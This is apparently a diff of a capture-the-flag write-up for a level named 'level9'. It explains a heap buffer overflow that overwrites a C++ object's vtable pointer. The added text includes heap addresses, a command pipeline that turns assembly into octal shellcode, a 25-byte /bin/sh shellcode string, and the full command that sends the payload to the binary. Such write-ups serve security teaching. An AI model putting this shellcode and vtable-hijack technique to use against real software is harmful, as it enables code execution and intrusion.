@@ -149,15 +149,6 @@ As seen in the disassembled constructor of `N`, the `vptr` is indeed held at off
  804870d:	90                   	nop
 ```
 
-gdb --batch \
-    -ex "start" \
-    -ex "ni 23" \
-    -ex "printf \"vtable ptr: 0x%x\n\", *(unsigned int*)0x0804a008" \
-    -ex "printf \"func ptr 1:  0x%x\n\", *(unsigned int*)(*(unsigned int*)0x0804a008 + 0x0)" \
-    -ex "printf \"func ptr 2:  0x%x\n\", *(unsigned int*)(*(unsigned int*)0x0804a008 + 0x4)" \
-    -ex "continue" \
-    --args ./level9 xxx
-
 Let's desconstruct `n1` and `n2`'s vtbls base on their respective addresses.
 We should notice that they share the same vtbl.
 ```sh
@@ -194,26 +185,41 @@ Their vtbl can be schematised in the following way:
 
 ### Intent
 
-We want to overwrite `n2`'s pointer to its [virtual method table](https://en.wikipedia.org/wiki/Virtual_method_table) and redirect control flow to a malicious fake [vtbl](https://en.wikipedia.org/wiki/Virtual_method_table), which in turn points to our shellcode to trigger a `system("/bin/sh")` call.
+We want to overwrite `n2`'s pointer to its [virtual method table](https://en.wikipedia.org/wiki/Virtual_method_table) *(`n2->vptr`)* and redirect control flow to a malicious [vtbl](https://en.wikipedia.org/wiki/Virtual_method_table), which in turn points to our shellcode to trigger a `system("/bin/sh")` call.
 
-To perform this, we wish to modify the program's **heap** in the following way: 
+To achieve this, we perform a buffer overflow of `n1->annotation` and modify the **heap** in the following way:
 ```sh
 # State before exploit:
 [                        n1                       ][                        n2                       ]
-[   n1 vtbl   ][ annotation ][ nbr ]      ...     ][   n2 vtbl   ][ annotation ][ nbr ]      ...     ]
-# Intended state after exploit:
+[   n1->vptr  ][ annotation ][ nbr ]      ...     ][   n2->vptr  ][ annotation ][ nbr ]      ...     ]
+# State after exploit:
 [     ...     ][ fake_vtbl ][ shellcode ][   ...  ][ptr_fake_vtbl][                ...               ]
 ```
 
-The `fake_vtbl` is placed at the start of the payload for practical reasons as the address of annotation is easy to find.
-
 ## Exploit
 
-First let's define the address of our `fake_vtbl`. It will be assigned to `n2->vtbl`, as the entrypoint to our exploit.
-```sh
-```
+### Virtual Method Table
 
-First of all, bulding a shellcode byte sequence manually (as an **little-endian octal** encoded string) is too error-prone. Instead, we generate it from an assembled binary based on the following [exploit.asm](./Ressources/data/exploit.asm) script.
+The script calls only one virtual function, which is `n2->operator+`.  
+Being the first declared virtual function, it is the first element of the **virtual method table**.
+
+In other words, our `fake_vtbl` only need to be 4 bytes long for our payload to work.
+
+### Base Addresses
+
+`n1->annotation` is located **4 bytes** after `n1`. Based on that, we know that:
+- It's address is `0x0804a008` + `0x4` = `0x0804a00c`  
+- In **little-endian hex** escape sequence: `\x0c\xa0\x04\x08`.  
+- In **little-endian oct** escape sequence: `\014\240\004\010`.  
+
+`n2->vptr` is located **0 bytes** after `n2`. Based on that, we know that:
+- It's address is `0x0804a078` + `0x0` = `0x0804a078`  
+- In **little-endian hex** escape sequence: `\x78\xa0\x04\x08`.  
+- In **little-endian oct** escape sequence: `\170\240\004\010`.  
+
+### Shellcode
+
+Building a shellcode byte sequence manually (as an **little-endian octal** encoded string) is too error-prone. Instead, we generate it from an assembled binary based on the following [exploit.asm](./Ressources/data/exploit.asm) script.
 ```sh
 $ tmpdir=$(mktemp -d);
 $ asm_payload_filepath="./data/exploit.asm";
@@ -223,17 +229,6 @@ $ nasm -f elf32 "$asm_payload_filepath" -o "$tmpdir/exploit.o";
 
 # Link the object file into a binary.
 $ ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin";
-080486f6 <_ZN1NC1Ei>:
- 80486f6:	55                   	push   %ebp
- 80486f7:	89 e5                	mov    %esp,%ebp
- 80486f9:	8b 45 08             	mov    0x8(%ebp),%eax
- 80486fc:	c7 00 48 88 04 08    	movl   $0x8048848,(%eax)
- 8048702:	8b 45 08             	mov    0x8(%ebp),%eax
- 8048705:	8b 55 0c             	mov    0xc(%ebp),%edx
- 8048708:	89 50 68             	mov    %edx,0x68(%eax)
- 804870b:	5d                   	pop    %ebp
- 804870c:	c3                   	ret    
- 804870d:	90                   	nop
 
 # Extract the content of the ELF .text section as raw bytes.
 $ objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin";
@@ -246,49 +241,14 @@ $ octal_shellcode_byte_length=$(printf "%b" "$octal_shellcode" | wc -c);
 25
 ```
 
-For practical and simplicity reasons, we will place our **fake vtbl** at the start of
+### Payload
 
+The exploit's payload must be at least (`n2` - `n1`) + `sizeof(n2->vptr)` = `0x0804a078` - `0x0804a00c` + `0x4` = **`112 bytes`** long.
 
-<!-- 
-
-We wish to build a
-
------
-
-We wish to build a payload following the following prototype:
 ```sh
-[shellcode address][shellcode][padding][vtabl address + 0x0]
+$ fake_vtbl="\020\240\004\010"; # (void *)[1] containing a pointer to the shellcode, injected immediately after (+0x4 bytes).
+$ shellcode="\061\300\120\150\156\057\163\150\150\057\057\142\151\211\343\120\123\211\341\061\322\260\013\315\200"; # Generated via ./Ressources/data/exploit.asm
+$ padding="79"; # 112 = 4 (fake_vtbl) + 25 (shellcode) + X (padding) + 4 (fake_vtbl_addr)
+$ fake_vtbl_addr="\014\240\004\010"; # Address of `n1->annotation`
+$ ./level9 "$(printf "%b%b%*c%b" "$fake_vtbl" "$shellcode" "$padding" "c" "$fake_vtbl_addr")";
 ```
-
-```sh
-printf
-```
-
-<!-- Bulding a shellcode byte sequence manually (as an **little-endian hexadecimal or octal** encoded string) is too error-prone. Instead, we generate it from an assembled binary based on the following [exploit.asm](./Ressources/data/exploit.asm) script.
-
-The conversion can be done through the following set of commands
-```sh
-$ tmpdir=$(mktemp -d);
-$ asm_payload_filepath="./data/exploit.asm";
-
-# Compile the assembly program to an object file.
-$ nasm -f elf32 "$asm_payload_filepath" -o "$tmpdir/exploit.o";
-
-# Link the object file into a binary.
-$ ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin";
-
-# Extract the content of the ELF .text section as raw bytes.
-$ objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin";
-
-# Format the bytes into an octal shellcode payload.
-# We use octal because dash's printf implementation does not support the '\xHH' escape format.
-$ octal_shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
-$ octal_shellcode_byte_length=$(printf "%b" "$octal_shellcode" | wc -c);
-``` -->
-
-<!-- Assuming the payload starts immediately with the shellcode, we can define the address where we want to redirect the code's flow as such:
-- In **big-endian hex** notation, it's located at: `0x0804a008`.
-- In **little-endian hex** escape sequence, it's located at: `\x08\xa0\x04\x08`.
-- In **little-endian oct** escape sequence, it's located at: `\010\240\004\010`. -->
-
-... -->
